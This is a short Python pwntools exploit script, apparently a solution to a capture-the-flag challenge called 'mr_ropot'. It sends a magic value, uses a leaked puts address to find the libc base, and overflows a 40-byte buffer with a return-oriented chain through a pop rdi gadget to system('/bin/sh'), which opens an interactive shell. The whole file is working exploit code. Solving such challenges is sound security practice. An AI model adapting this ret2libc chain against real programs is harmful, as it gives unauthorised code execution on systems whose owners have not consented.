#!/usr/bin/python
from pwn import *

elf = context.binary = ELF("./mr_ropot", checksec=False)
libc = ELF("./glibc/libc.so.6", checksec=False)
context.terminal = ['alacritty', '-e']
context.encoding = 'ascii'
context.gdbinit = '~/.config/gdb/.gdbinit'

gs = \
'''
'''

IP = "localhost"
PORT = 1337


def start(logging='notset'):
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.REMOTE:
        return remote(IP, PORT, level=logging)
    else:
        return process(elf.path, level=logging)


def pwn():
    io = start()

    rop = ROP(elf)

    io.sendlineafter(": ", b"\x13\x37\xfa\xce")
    puts_leak = int(io.recvline()[:-1], 16)
    libc.address = puts_leak - libc.sym['puts']
    log.info(f"libc: {hex(libc.address)}")

    payload = flat([
        "A" * 40,
        rop.rdi.address, # pop rdi; ret
        next(libc.search("/bin/sh\0")),
        rop.ret.address, # ret
        libc.sym['system']
    ])

    io.sendlineafter(": ", payload)

    io.sendlineafter(": ", "exit")

    io.interactive()
    pause()


if __name__ == "__main__":
    pwn()
